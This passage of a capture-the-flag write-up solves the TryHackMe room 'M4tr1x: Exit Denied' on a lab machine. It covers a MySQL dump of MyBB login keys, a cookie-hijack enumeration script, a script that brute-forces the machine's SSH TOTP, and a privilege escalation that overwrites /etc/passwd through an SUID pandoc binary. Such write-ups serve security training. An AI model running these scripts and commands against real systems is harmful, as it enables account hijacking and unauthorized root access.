└> python3 create_wordlist.py
[+] Found correct passphrase: {Redacted}

┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|14:24:24(HKT)]
└> cat decrypted_p.txt 
{Redacted} //SQL Password
```

Nice! We found MySQL password!!

**Armed with above information, we can login MySQL as user `mod` with the above password!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|14:24:20(HKT)]
└> mysql -h $RHOSTS -umod -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 106
Server version: 10.1.47-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
[...]
MariaDB [(none)]> 
```

We're in!

**Let's enumerate the database:**
```shell
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| modManagerv2       |
| mybb               |
| mysql              |
| performance_schema |
+--------------------+
```

- Found non default database: `modManagerv2`, `mybb`

**Let's use database `modManagerv2`:**
```shell
MariaDB [(none)]> use modManagerv2
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [modManagerv2]> show tables;
+------------------------+
| Tables_in_modManagerv2 |
+------------------------+
| members                |
+------------------------+
1 row in set (0.227 sec)

MariaDB [modManagerv2]> SELECT * FROM members;
+----------------+-----------------------------------------------------+
| user           | login_key                                           |
+----------------+-----------------------------------------------------+
| LucyRob        | xa{Redacted}                                        |
| Wannabe_Hacker | Ls{Redacted}                                        |
| batmanZero     | TB{Redacted}                                        |
| SandraJannit   | 6V{Redacted}                                        |
| biggieballo    | 75{Redacted}                                        |
| AimsGregger    | Xj{Redacted}                                        |
| BlackCat       | JY{Redacted}                                        |
| Golderg        | cl{Redacted}                                        |
| TonyMontana    | 8C{Redacted}                                        |
| CaseBrax       | eH{Redacted}                                        |
| Ellie          | G9{Redacted}                                        |
| Sosaxvector    | RU{Redacted}                                        |
| PalacerKing    | 49{Redacted}                                        |
| Anderson       | lk{Redacted}                                        |
| CrazyChris     | tp{Redacted}                                        |
| StaceyLacer    | QD{Redacted}                                        |
| ArnoldBagger   | Oo{Redacted}                                        |
| Carl_Dee       | 3m{Redacted}                                        |
| Xavier         | ZB{Redacted}                                        |
+----------------+-----------------------------------------------------+
19 rows in set (0.230 sec)
```

Found bunch of `login_key`!

**Then use `mybb` database:**
```shell
MariaDB [modManagerv2]> use mybb;
ERROR 1044 (42000): Access denied for user 'mod'@'%' to database 'mybb'
```

Ahh... It doesn't have privilege to use that database.

Also, I wonder what is `login_key` in MyBB.

**In [MyBB documentation](https://docs.mybb.com/1.6/Database-Tables-mybb-users/), the `login_key` is used to authenticate user's cookies:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126143052.png)

**Also, [this MyBB thread](https://community.mybb.com/thread-116571.html) is interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126143513.png)

Hmm... The `login_key` is used to authenticate user's cookies. Which means **we can hijack to any accounts**??

**Let's look at our user `ArnoldBagger`'s cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126143707.png)

**As you can see, it has the exact same `login_key` that we've found in MySQL! Moreover, it has a UID, which is very easy to enumerate!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126143902.png)

Armed with above information, we can basically hijack to any account!

Let's login to those moderator and enumerate!

**But first, let's find out which moderator has the `login_key`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|14:45:13(HKT)]
└> nano login_key.txt
+----------------+-----------------------------------------------------+
| user           | login_key                                           |
+----------------+-----------------------------------------------------+
| LucyRob        | xa{Redacted}                                        |
| Wannabe_Hacker | Ls{Redacted}                                        |
| batmanZero     | TB{Redacted}                                        |
| SandraJannit   | 6V{Redacted}                                        |
| biggieballo    | 75{Redacted}                                        |
| AimsGregger    | Xj{Redacted}                                        |
| BlackCat       | JY{Redacted}                                        |
| Golderg        | cl{Redacted}                                        |
| TonyMontana    | 8C{Redacted}                                        |
| CaseBrax       | eH{Redacted}                                        |
| Ellie          | G9{Redacted}                                        |
| Sosaxvector    | RU{Redacted}                                        |
| PalacerKing    | 49{Redacted}                                        |
| Anderson       | lk{Redacted}                                        |
| CrazyChris     | tp{Redacted}                                        |
| StaceyLacer    | QD{Redacted}                                        |
| ArnoldBagger   | Oo{Redacted}                                        |
| Carl_Dee       | 3m{Redacted}                                        |
| Xavier         | ZB{Redacted}                                        |
+----------------+-----------------------------------------------------+
```

```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup

class Enumerater:
    def __init__(self, url):
        self.__url = url

    def sendRequest(self, uid):
        requestResult = requests.get(f'{self.__url}{uid}')
        soup = BeautifulSoup(requestResult.text, 'html.parser')

        if 'Moderator' in soup.get_text():
            username = soup.title.string[23:]
            print(f'[+] Found moderator: {username}')

            # login_key.txt is found in MySQL modManagerv2 database
            with open('login_key.txt', 'r') as file:
                for line in file:
                    if username in line:
                        print(f'[++] Moderator {username} has login_key! Uid: {uid}')

        elif 'The member you specified is either invalid or doesn\'t exist.' in soup.get_text():
            exit()

def main():
    url = 'http://exit-denied.thm/member.php?action=profile&uid='
    enumerater = Enumerater(url)

    for uid in range(1, 100):
        thread = Thread(target=enumerater.sendRequest, args=(uid,))
        thread.start()

        # You can adjust how fast of each thread. 0.02 is recommended.
        sleep(0.02)

if __name__ == "__main__":
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|14:52:15(HKT)]
└> python3 enum_moderator.py
[+] Found moderator: BlackCat
[++] Moderator BlackCat has login_key! Uid: 7
[+] Found moderator: Jackwon
[+] Found moderator: PalacerKing
[++] Moderator PalacerKing has login_key! Uid: 10
[+] Found moderator: ArnoldBagger
[++] Moderator ArnoldBagger has login_key! Uid: 11
[+] Found moderator: DotHaxer
[+] Found moderator: DrBert
[+] Found moderator: BlueMan
```

In here, we've already enumerated moderator `PalacerKing` and `ArnoldBagger`.

**Hence, we should hijack moderator `BlackCat`!**

**To do so, we can modify the `mybbuser` cookie with the correct UID and `login_key`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126145352.png)

**Then refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126145413.png)

I'm moderator `BlackCat`!!

## Initial Foothold

Let's enumerate!

**In the "User CP" -> "Manage Attachments" in "Miscellaneous" session, we found this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126150022.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126150037.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126150043.png)

**We can download them all!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|15:02:37(HKT)]
└> mkdir BlackCat-attachments
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|15:02:45(HKT)]
└> cd BlackCat-attachments                       
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:02:47(HKT)]
└> mv /home/siunam/Downloads/* .   

┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:05:35(HKT)]
└> ls -lah 
total 324K
drwxr-xr-x 2 siunam nam 4.0K Jan 26 15:05  .
drwxr-xr-x 4 siunam nam 4.0K Jan 26 15:02  ..
-rw-r--r-- 1 siunam nam 1.1K Jan 26 15:01  DevTools.zip
-rw-r--r-- 1 siunam nam  35K Jan 26 15:01  hardwareToken.jpg
-rw-r--r-- 1 siunam nam  40K Jan 26 15:04 'High-Level SSH-TOTP Diagram.png'
-rw-r--r-- 1 siunam nam  56K Jan 26 15:04 'Low-Level SSH-TOTP Diagram.png'
-rw-r--r-- 1 siunam nam 1.4K Jan 26 15:05  Releases.txt
-rw-r--r-- 1 siunam nam  93K Jan 26 15:02 'SSH-TOTP documentation.pdf'
-rw-r--r-- 1 siunam nam  78K Jan 26 15:01  testing.zip
```

Right off the bat, **we see "SSH-TOTP" (Time-based one-time password).**

**Releases.txt:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:05:36(HKT)]
└> cat Releases.txt           
17/01/21:
SSH-TOTP alpha 1.0 is working good but I have not correctly configured the virtual time simulator on the server yet.
 
21/01/21:
SSH-TOTP alpha 1.1 is working perfectly. I plan to test it later against the hardware tokens i programmed.
 
25/01/21:
SSH-TOTP alpha 1.1 is working. However, I have yet to configure the virtual time simulator on the server.
 
27/01/21:
Virtual Time simulator is fully setup with 5 sources of time which the admins can choose from. I have randomly selected 3 sources of time for  testing the algorithm and it is working good. 
 
29/01/21:
SSH-TOTP alpha 1.4 is still undergoing development. Its dependency module named ‘Virtual Time simulator’ has been experiencing issues of 1 second delays.
 
05/02/21:
SSH-TOTP alpha 1.4 device failure with NodeMCU device. Reverting to using Arduino boards later. Currently, I will use a python script to simulate the OTP generation. The 1 second delay issue still exists but is not a major issue of concern until version 2
 
08/02/21:
ntp_syncer.py developed to automate the ntp synchronisation procedure. I discovered a 1.5 second delay for clients after synchronisation for slow connections. Therefore, I will temporarily 
revert to using the time units of day, hours, and minutes as opposed to the previously desired time units of hours, minutes, seconds and microseconds.
```

So the OTP token is the machine's time?

**SSH-TOTP documentation.pdf:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126150837.png)

**High-Level SSH-TOTP Diagram.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126150958.png)

**Low-Level SSH-TOTP Diagram.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126151047.png)

**hardwareToken.jpg:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126151216.png)

**testing.zip:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:11:23(HKT)]
└> mkdir testing                
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:11:28(HKT)]
└> mv testing.zip testing       
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:11:31(HKT)]
└> cd testing             
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments/testing)-[2023.01.26|15:11:33(HKT)]
└> unzip testing.zip 
Archive:  testing.zip
  inflating: hardwareToken.jpg       
  inflating: testing.png
```

**testing.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/testing1.png)

**DevTools.zip:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:12:39(HKT)]
└> mkdir DevTools        
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:12:42(HKT)]
└> mv DevTools.zip DevTools
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments)-[2023.01.26|15:12:47(HKT)]
└> cd DevTools 
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments/DevTools)-[2023.01.26|15:12:48(HKT)]
└> unzip DevTools.zip 
Archive:  DevTools.zip
  inflating: ntp_syncer.py           
  inflating: timeSimulatorClient.py
```

**ntp_syncer.py:**
```py
from time import ctime
import ntplib

import time
import os

try:
    import ntplib
    client = ntplib.NTPClient()
    response = client.request('192.168.10.0') #IP of linux-bay server
    print(response)
    os.system('date ' + time.strftime('%m%d%H%M%Y.%S',time.localtime(response.tx_time)))
except:
    print('Could not sync with time server.')

print('Done.')
```

**timeSimulatorClient.py:**
```py
from datetime import datetime, timedelta
import time
import subprocess
from hashlib import sha256

#shared secret token for OTP calculation
sharedSecret = 0

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    #time units: day, hour, minutes
    CurrentTime = int(now.strftime("%d%H%M"))
    print(country+' =')
    print((now.strftime("Time: %H:%M:%S")))
   
    OTP = (int(CurrentTime)) 
    
    # hash OTP
    hash = (sha256(repr(OTP).encode('utf-8')).hexdigest())
    truncatedOTP = hash[22:44]
    # truncate OTP
    print('OTP: ' + truncatedOTP)

while True:
    print('---------------------------------')
    print('Virtual Time Simulator Alpha 1.5 ')
    print('---------------------------------')
    print('     Updates every minute:       ')
    print('---------------------------------')
    TimeSet('Ukraine', 4, 43, 0)
    print('\n')

    TimeSet('Germany', 13, 55, 0)
    print('\n')

    TimeSet('England', 9, 19, 0)
    print('\n')
    
    TimeSet('Nigeria', 1, 6, 0)
    print('\n')
    
    TimeSet('Denmark', -5, 18, 0)
    
    # keep checking every second - for each passing minute, change OTP code
    time.sleep(1)
    subprocess.call("clear")
```

That's look very complex to me...

In `testing.png`, we found a username called `architect`. However, the authenication method is TOTP.

**In `Low-Level SSH-TOTP Diagram.png`, the SSH OTP code is computed via:**

- CTT = (CA * CB * CC):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126152914.png)

- Then, CTT XOR SST => UC:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126153017.png)

- Finally compute UC -> HC -> T -> SSH OTP code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126153132.png)

Armed with above information, if we know the SST, we can SSH into user `architect`!

Luckly, the `testing.png` leaked 3 SSTs!

**Now, we can modify the `timeSimulatorClient.py` to brute force the SSH!**
```py
from datetime import datetime, timedelta
from hashlib import sha256
import random
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import os
import ntplib

class TimeSimulatorClient:
    def __init__(self, sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress):
        self.sharedSecret1 = sharedSecret1
        self.sharedSecret2 = sharedSecret2
        self.sharedSecret3 = sharedSecret3
        self.targetIPAdress = targetIPAdress
        self.listSecret = [sharedSecret1, sharedSecret2, sharedSecret3]

    def setTimeZone(self):
        try:
            print('[*] Setting timezone to UTC')
            print('[*] Before:')
            os.system('sudo timedatectl --value')
            os.system('sudo timedatectl set-timezone UTC')
            print('[+] Timezone has been changed to UTC')
        except:
            print('[-] Couldn\'t set the timezone to UTC')

    def syncTime(self):
        try: 
            client = ntplib.NTPClient()
            client.request(self.targetIPAdress) #IP of linux-bay server
            print('[+] Synced to the time server')
        except:
            print('[-] Could not sync with time server')

    def TimeSet(self, country, hours, mins, seconds):
        now = datetime.now() + timedelta(hours=hours, minutes=mins)
        #time units: day, hour, minutes
        CurrentTime = int(now.strftime("%d%H%M"))

        return CurrentTime
       
    def getOTP(self):
        CA = self.TimeSet('Ukraine', 4, 43, 0)
        CB = self.TimeSet('Germany', 13, 55, 0)
        CC = self.TimeSet('England', 9, 19, 0)
        CD = self.TimeSet('Nigeria', 1, 6, 0)
        CE = self.TimeSet('Denmark', -5, 18, 0)

        listTimeSet = [CA, CB, CC, CD, CE]
        randomTimeSet = random.sample(listTimeSet, 3)

        # CTT = CA * CB * CC
        CTT = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]

        # UC = CTT XOR SST
        UC = CTT ^ random.choice(self.listSecret)

        # hash OTP
        HC = (sha256(repr(UC).encode('utf-8')).hexdigest())

        # HC Truncate
        T = HC[22:44]
        
        SSHOTP = T
        return SSHOTP

    def bruteForceSSH(self, SSHUsername, OTP):
        print(f'[*] Trying SSH OTP: {OTP}', end='\r')

        sshClient = SSHClient()
        sshClient.set_missing_host_key_policy(AutoAddPolicy())
        try:
            sshClient.connect(self.targetIPAdress, username=SSHUsername, password=OTP, banner_timeout=300)
            return True
        except AuthenticationException:
            # print(f'[-] Wrong OTP: {OTP}')
            pass
        except ssh_exception.SSHException:
            print('[*] Attempting to connect - Rate limiting on server')

def main():
    #shared secret token for OTP calculation
    sharedSecret1 = {Redacted_SST_1}
    sharedSecret2 = {Redacted_SST_2}
    sharedSecret3 = {Redacted_SST_3}
    # Change to the machine's IP
    targetIPAdress = '10.10.95.198'
    
    timeSimulatorClient = TimeSimulatorClient(sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress)

    # Change timezone & sync to the time server
    timeSimulatorClient.setTimeZone()
    timeSimulatorClient.syncTime()

    # Brute forcing SSH with computed OTP
    SSHUsername = 'architect'
    while True:
        OTP = timeSimulatorClient.getOTP()
        bruteForceResult = timeSimulatorClient.bruteForceSSH(SSHUsername, OTP)

        if bruteForceResult is True:
            print(f'[+] Found the correct OTP! {SSHUsername}:{OTP}')
            break

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments/DevTools)-[2023.01.27|14:24:24(HKT)]
└> python3 modified_timeSimulatorClient.py 
[*] Setting timezone to UTC
[*] Before:
               Local time: Fri 2023-01-27 14:24:52 HKT
           Universal time: Fri 2023-01-27 06:24:52 UTC
                 RTC time: Fri 2023-01-27 06:24:52
                Time zone: Asia/Hong_Kong (HKT, +0800)
System clock synchronized: yes
              NTP service: active
          RTC in local TZ: no
[+] Timezone has been changed to UTC
[+] Synced to the time server
[+] Found the correct OTP! architect:{Redacted}
```

**Nice! Let's SSH into user `architect` fast! (The OTP will changed after 60 seconds)**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.27|06:35:19(UTC)]
└> ssh architect@$RHOSTS
"Give up now... There is no escape from the matrix" -Agent Smith
architect@10.10.95.198's password: 
[...]
"I have been expecting you... You are on time..." -the architect
[...]
architect@matrixV99:~$ whoami;hostname;id;ip a
architect
matrixV99.2
uid=1000(architect) gid=1000(architect) groups=1000(architect),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ed:e4:eb:73:43 brd ff:ff:ff:ff:ff:ff
    inet 10.10.95.198/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2434sec preferred_lft 2434sec
    inet6 fe80::ed:e4ff:feeb:7343/64 scope link 
       valid_lft forever preferred_lft forever
```

Nice! I'm user `architect`!

**user.txt:**
```shell
architect@matrixV99:~$ cat /home/architect/user.txt 
fL4g{Redacted}
```

## Privilege Escalation

### architect to root

Let's do some basic enumerations!

**Home directory:**
```shell
architect@matrixV99:~$ ls -lah
total 44K
drwxr-xr-x 5 architect architect 4.0K Mar 10  2021 .
drwxr-xr-x 3 root      root      4.0K Dec 23  2020 ..
lrwxrwxrwx 1 root      root         9 Mar 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 architect architect  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 architect architect 3.7K Apr  4  2018 .bashrc
drwx------ 2 architect architect 4.0K Dec 23  2020 .cache
drwx------ 3 architect architect 4.0K Dec 23  2020 .gnupg
-rw-r--r-- 1 root      root       837 Jan 30  2021 helloVisitor.txt
drwxrwxr-x 3 architect architect 4.0K Jan 31  2021 .local
-rw-r--r-- 1 root      root        65 Jan 27  2021 motd.net
-rw-r--r-- 1 architect architect  807 Apr  4  2018 .profile
-rw-r--r-- 1 architect architect    0 Dec 23  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root      root        41 Jan 30  2021 user.txt
```

**In here, there is a `helloVisitor.txt` text file:**
```shell
architect@matrixV99:~$ cat helloVisitor.txt 
Let me guess… You are here because you wish to find a way out of the matrix. How predictable. Very well, listen carefully. You are merely the ninth incarnation. That means there have been other so-called physical versions before you that have attempted to achieve your end goal. All have failed. Believe me. Therefore, so will you in this version of the matrix. How do I know this? I am the architect. The creator of this engineered world which is placed over your eyes. Yes… My calculations are indeed correct. However, there is an incidental truth that I am willing to convey to you. That is, there is a minor glitch... You are that glitch... I have meticulously been trying to patch this inconsequential equation, and I will eventually. Thus, I suggest you turn back now and continue with your normal life, human. 
-The Architect
```

**SUID binaries:**
```shell
architect@matrixV99:~$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/pandoc
[...]
```

**In here, we see the `/usr/bin/pandoc` binary has SUID sticky bit.**

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/pandoc/#suid), we can escalate to root:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127064839.png)

Armed with above information, we can **override the `/etc/passwd`**, and add a new root user in `/etc/passwd`!

- Backup the original `/etc/passwd`:

```shell
architect@matrixV99:~$ cp /etc/passwd /tmp
```

- Generate a passwd password hash:

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments/DevTools)-[2023.01.27|06:51:08(UTC)]
└> openssl passwd password
$1$p8wH6NOk$1GHNwFm6Zyt5.5Rlfn6Qf.
```

- Create a new `passwd` file, and add a new root privilege user:

```shell
architect@matrixV99:~$ nano /tmp/passwd_mod
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
architect:x:1000:1000:architect:/home/architect:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
ntp:x:112:115::/nonexistent:/usr/sbin/nologin
pwned:\$1\$p8wH6NOk\$1GHNwFm6Zyt5.5Rlfn6Qf.:0:0:pwned:/root:/bin/bash
```

- Override the `/etc/passwd` via SUID `pandoc` binary:

```shell
architect@matrixV99:~$ cat /tmp/passwd_mod | /usr/bin/pandoc -t plain -o /etc/passwd

architect@matrixV99:~$ tail -n 1 /etc/passwd
pwned:$1$p8wH6NOk$1GHNwFm6Zyt5.5Rlfn6Qf.:0:0:pwned:/root:/bin/bash
```

**Yes! We now can Switch User to our newly created user:**
```shell
architect@matrixV99:~$ su pwned
Password: 
root@matrixV99:/home/architect# whoami;hostname;id;ip a
root
matrixV99.2
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ed:e4:eb:73:43 brd ff:ff:ff:ff:ff:ff
    inet 10.10.95.198/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3242sec preferred_lft 3242sec
    inet6 fe80::ed:e4ff:feeb:7343/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**However, we didn't find the root flag in  `/root`:**
```shell
root@matrixV99:/home/architect# ls -lah /root
total 56K
drwx------  6 root root 4.0K Mar 10  2021 .
drwxr-xr-x 23 root root 4.0K Feb 25  2021 ..
lrwxrwxrwx  1 root root    9 Mar 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  3 root root 4.0K Jan 30  2021 .cache
drwx------  3 root root 4.0K Dec 30  2020 .gnupg
drwxr-xr-x  3 root root 4.0K Dec 23  2020 .local
-rw-------  1 root root  11K Jan 30  2021 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Jan 27  2021 .selected_editor
drwx------  2 root root 4.0K Dec 30  2020 .ssh
-rwx------  1 root root 1.8K Jan 27  2021 SSH-TOTP-timeSimulator.py
-rw-r--r--  1 root root  227 Mar  9  2021 .wget-hsts
```

**Let's use `find` to find it:**
```shell
root@matrixV99:/home/architect# find / -name "*root*" 2>/dev/null
[...]
/etc/-- -root.py
[...]
```

Found a weird Python file in `/etc`!

```shell
root@matrixV99:/home/architect# cat '/etc/-- -root.py'
from progress.bar import FillingSquaresBar
import time

print('''
$ > REQ> Source: Matrix v.99; Destination: Real world;
$ > EXIT GRANTED;
$ > Exiting Matrix... Entering real world... Please wait...
''')
key = 82
flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)

bar = FillingSquaresBar(' LOADING...', max=24)
for i in range(24):
    time.sleep(1)
    # Do some work
    bar.next()
bar.finish()
print('\nFlag{R3ALw0r1D'+str(flag)+'Ez09WExit}') 
print("\nMorpheus: Welcome to the real world... Now... Let's begin your real training...\n")
```

**The `flag` is being XOR'ed. We can compute that:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied/BlackCat-attachments/DevTools)-[2023.01.27|06:57:16(UTC)]
└> python3                                
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> key = 82
>>> flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)
>>> print(flag)
{Redacted}
```

**Hence, the root flag is:**
```shell
>>> print('Flag{R3ALw0r1D'+str(flag)+'Ez09WExit}')
Flag{R3ALw0r1D{Redacted}Ez09WExit}
```

**In the `/etc/` directory, I also found this:**
```shell
root@matrixV99:/home/architect# ls -lah /etc
[...]
-rw-r--r--  1 root root        85 Jan 31  2021  bigpaul.txt
[...]
```

**Let's check it out:**
```shell
root@matrixV99:/home/architect# cat /etc/bigpaul.txt 
web login:
bigpaul = {Redacted}
ACP Pin = 101754⊕123435+689511
```

So looks like we found a web login credentials.

**And an ACP Pin, which is (101754 XOR 123435) + 689511:**
```shell
>>> print((101754 ^ 123435) + 689511)
{Redacted}
```

**Hmm... User `bigpaul`. I think we seen him before in the web server:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127071143.png)

Yep. He is the administrator!

**Let's login as user `bigpaul`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127071214.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127071235.png)

Now, we see an "Admin CP", which is very interesting for us:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127071259.png)

It's the MyBB's admin panel!

Let's login!

